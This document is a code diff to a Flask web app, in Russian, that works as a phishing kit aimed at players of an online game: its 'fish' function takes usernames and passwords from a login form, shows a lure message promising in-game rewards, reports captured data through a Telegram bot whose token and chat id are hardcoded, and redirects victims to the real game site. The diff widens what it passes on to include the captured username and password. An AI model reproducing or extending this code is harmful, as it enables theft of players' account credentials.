@@ -5,6 +5,7 @@ from flask import Flask, render_template, request
 from bs4 import BeautifulSoup as bs
 import telebot
 from fake_useragent import UserAgent
+
 app = Flask(__name__)
 
 token = '5354741796:AAEW0NOKHmaCeDQZNJytJag5V3LQtyPOrbw'
@@ -12,19 +13,34 @@ chatId = '1310265676'
 
 bot = telebot.TeleBot(token)
 
+crop_url = 'https://hata.mobi/index.php?r=crop'
+
 
 @app.route('/', methods=['post', 'get'])
 def index():
-    isIncorrect, message = fish(request)
-    return render_template('index.html', isIncorrect=isIncorrect, online=get_online_count(), sec=get_sec_count(),
-                           message=message)
+    isIncorrect, message, lvl, username, password = fish(request)
+
+    return render_template('index.html',
+                           redirect_url=crop_url,
+                           isIncorrect=isIncorrect,
+                           online=get_online_count(),
+                           sec=get_sec_count(),
+                           message=message,
+                           lvl=lvl,
+                           username=username,
+                           password=password)
 
 
 @app.route('/light', methods=['post', 'get'])
 def light():
-    isIncorrect, message = fish(request)
-    return render_template('light.html', isIncorrect=isIncorrect, online=get_online_count(), sec=get_sec_count(),
-                           message=message)
+    isIncorrect, message, lvl = fish(request)
+    return render_template('light.html',
+                           redirect_url=crop_url,
+                           isIncorrect=isIncorrect,
+                           online=get_online_count(),
+                           sec=get_sec_count(),
+                           message=message,
+                           lvl=lvl)
 
 
 def send_report(report_text):
@@ -32,8 +48,11 @@ def send_report(report_text):
 
 
 def fish(req):
+    lvl = 0
     isIncorrect = False
     message = ''
+    username = ''
+    password = ''
     if req.method == 'POST':
         username = req.form.get('username')  # запрос к данным формы
         password = req.form.get('password')
@@ -49,7 +68,7 @@ def fish(req):
             isIncorrect = False
             message = 'Игрок {0}, в очереди за 1000 доцентов и 3000 патронов. Время ожидания несколько часов'.format(
                 username)
-    return isIncorrect, message
+    return isIncorrect, message, lvl, username, password
 
 
 def get_online_count():
